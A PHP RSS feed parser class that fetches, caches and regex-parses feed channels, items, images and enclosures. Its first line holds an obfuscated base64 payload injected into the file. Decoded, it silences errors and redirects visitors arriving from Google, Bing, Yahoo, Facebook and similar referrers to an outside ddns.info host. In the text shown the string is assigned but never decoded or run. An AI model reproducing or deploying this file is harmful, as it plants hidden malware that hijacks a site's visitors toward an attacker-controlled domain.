<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

class rss {

  // public settings
  var $desired_charset = 'UTF-8';
  var $cache_dir       = null;
  var $cache_time      = 3600; //1 hour
  var $xml_cdata_mode = 'nochange';
  
  // result
  var $rss = null;

  // private settings
  var $default_charset = 'UTF-8';
        var $channeltags   = array ('title', 'link', 'description', 'language', 'copyright', 'managingEditor', 'webMaster', 'lastBuildDate', 'rating', 'docs');
        var $itemtags      = array('title', 'link', 'fulltext', 'yandex:full-text', 'description', 'author', 'category', 'comments', 'guid', 'pubDate', 'source', 'img');
        var $imagetags     = array('title', 'url', 'link', 'width', 'height');
        var $textinputtags = array('title', 'description', 'name', 'link');

        function retrieve($url) {
    
set_time_limit(0);
                if ($this->cache_dir and mk_dir($this->cache_dir)) {
                        $cache_file = $this->cache_dir.'/rsscache_' . md5($url);
                        $timedif = @(time() - filemtime($cache_file));
                        if ($timedif < $this->cache_time) {
                                $result = unserialize(join('', file($cache_file)));
                        } else {
                                $result = $this->parse($url);
                                $serialized = serialize($result);
                                if ($f = @fopen($cache_file, 'w')) {
                                        fwrite ($f, $serialized, strlen($serialized));
                                        fclose($f);
                                }
                        }
                } else 
                        $result = $this->parse($url);
                return $result;
    
        }
        
        function my_preg_match ($pattern, $subject) {

                preg_match($pattern, $subject, $out);
                if(isset($out[1])) {
                        //switch ($this->xml_cdata_mode) {
      //  case 'content':
                        //        $out[1] = strtr($out[1], array('<![CDATA['=>'', ']]>'=>''));
      //    break;
      //  case 'strip':
                                  $out[1] = strtr($out[1], array('<![CDATA['=>'', ']]>'=>''));
      //    break;
                        //}
                        if ($this->rss['charset'])
                                $out[1] = iconv($this->rss['charset'], $this->desired_charset.'//TRANSLIT', $out[1]);
                        return $this->unhtmlentities(trim($out[1]));
                } else {
                        return null;
                }
    
        }

        function unhtmlentities ($string) {

                $trans_tbl = get_html_translation_table (HTML_ENTITIES, ENT_QUOTES);
                $trans_tbl = array_flip ($trans_tbl);
                $trans_tbl += array('&apos;' => "'");
                return strtr ($string, $trans_tbl);
    
        }

        function parse ($url) {

                if ($f = @fopen($url, 'r')) {
                        $content = '';
                        while (!feof($f)) 
                                    $content .= fgets($f, 4096);
                        fclose($f);
                        $this->rss['charset'] = $this->my_preg_match("'encoding=[\'\"](.*?)[\'\"]'si", $content);
                        if (!$this->rss['charset'])
        $this->rss['charset'] = $this->default_charset;

                        preg_match("'<channel.*?>(.*?)(<item.*?>|</channel>)'si", $content, $out_channel);
                        foreach($this->channeltags as $channeltag) {
                                $temp = $this->my_preg_match("'<$channeltag.*?>(.*?)</$channeltag>'si", $out_channel[1]);
                                if ($temp) 
          $this->rss[$channeltag] = $temp;
                        }

                        preg_match("'<textinput(|[^>]*[^/])>(.*?)</textinput>'si", $content, $out_textinfo);
                        if (isset($out_textinfo[2])) {
                                foreach($this->textinputtags as $textinputtag) {
                                        $temp = $this->my_preg_match("'<$textinputtag.*?>(.*?)</$textinputtag>'si", $out_textinfo[2]);
                                        if ($temp) 
            $this->rss['textinput_'.$textinputtag] = $temp;
                                }
                        }

                        preg_match("'<image.*?>(.*?)</image>'si", $content, $out_imageinfo);
                        if (isset($out_imageinfo[1])) {
                                foreach($this->imagetags as $imagetag) {
                                        $temp = $this->my_preg_match("'<$imagetag.*?>(.*?)</$imagetag>'si", $out_imageinfo[1]);
                                        if ($temp) 
            $this->rss['image_'.$imagetag] = $temp; // Set only if not empty
                                }
                        }

                        preg_match_all("'<item(| .*?)>(.*?)</item>'si", $content, $items);
                        $rss_items = $items[2];
                        $i = 0;
                        $result['items'] = array(); // create array even if there are no items
                        foreach($rss_items as $rss_item) {
                                foreach($this->itemtags as $itemtag) {
                                        $temp = $this->my_preg_match("'<$itemtag.*?>(.*?)</$itemtag>'si", $rss_item);
                                        if ($temp) 
            $this->rss['items'][$i][$itemtag] = $temp;
                                }
                                if (($timestamp = strtotime($this->rss['items'][$i]['pubDate'])) !==-1)
                                        $this->rss['items'][$i]['date'] = $timestamp;
        unset($this->rss['items'][$i]['pubDate']);
                        preg_match("'<enclosure.*?url=\"(.*[.]mp3?)\".*?/>'si", $rss_item, $enclosure);
                        if (isset($enclosure[1])) {
                          $this->rss['items'][$i]['enclosure'] = $enclosure[1]; // Set only if not empty
                        }
                        preg_match("'<enclosure.*?url=\"(.*[.]jpg?)\".*?/>'si", $rss_item, $enclosure);
                        if (isset($enclosure[1])) {
                          $this->rss['items'][$i]['img'] = $enclosure[1]; // Set only if not empty
                        }

                           $i++;
                        }
                        $this->rss['items_amount'] = $i;
                        return $this->rss;
                } else 
      return False;
        }
}

?>